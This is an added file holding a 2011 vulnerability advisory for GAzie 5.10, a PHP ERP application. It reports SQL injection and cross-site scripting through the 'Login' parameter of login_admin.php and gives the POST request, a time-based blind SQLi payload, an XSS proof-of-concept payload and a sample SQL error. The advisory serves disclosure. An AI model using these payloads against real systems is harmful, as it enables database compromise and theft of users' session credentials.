@@ -1,0 +1,55 @@
+GAzie 5.10 (Login parameter) Multiple Remote Vulnerabilities
+
+
+Vendor: Antonio de Vincentiis
+Product web page: http://www.devincentiis.it, http://gazie.sourceforge.net
+Affected version: 5.10
+
+Summary: GAzie is a multi-company management program (ERP)
+that runs on Apache web server with support for PHP and
+Mysql database. Open Source web-based application for small
+and medium enterprises.
+
+Desc: GAzie is prone to a cross-site scripting and an SQL Injection
+vulnerability because it fails to properly sanitize user-supplied input.
+An attacker may leverage this issue to execute arbitrary script code in
+the browser of an unsuspecting user in the context of the affected site.
+This may allow the attacker to steal cookie-based authentication credentials
+and to launch other attacks. Compromising the entire database structure and
+executing system commands is possible thru malicious SQL queries. The issues
+exist in the 'login_admin.php' script thru the 'Login' parameter.
+
+Tested on: Microsoft Windows XP Professional SP3 (EN)
+           Apache 2.2.14 (Win32)
+           PHP 5.3.1
+           MySQL 5.1.41
+
+Vulnerability discovered by: Gjoko 'LiquidWorm' Krstic
+                             liquidworm gmail com
+                             Zero Science Lab - http://www.zeroscience.mk
+
+
+Advisory ID: ZSL-2011-4995
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2011-4995.php
+
+
+04.02.2011
+
+
+-------------------------------------------------------------------
+
+POST /gazie/modules/root/login_admin.php HTTP/1.0
+
+----
+Content scenarios:
+
+1.(SQLi):         Login=1[SQLi]&Password=test&actionflag=Login
+2.(bSQLi-timing): Login=lqwrm'+or+sleep(5)%23&Password=test&actionflag=Login
+3.(XSS):          Login=1"><script>alert(1)</script>&Password=test&actionflag=Login
+
+-------------------------------------------------------------------
+
+Error gaz_dbi_get_row: You have an error in your SQL syntax; check the manual that
+corresponds to your MySQL server version for the right syntax to use near ''1''' at line 1
+
+-------------------------------------------------------------------
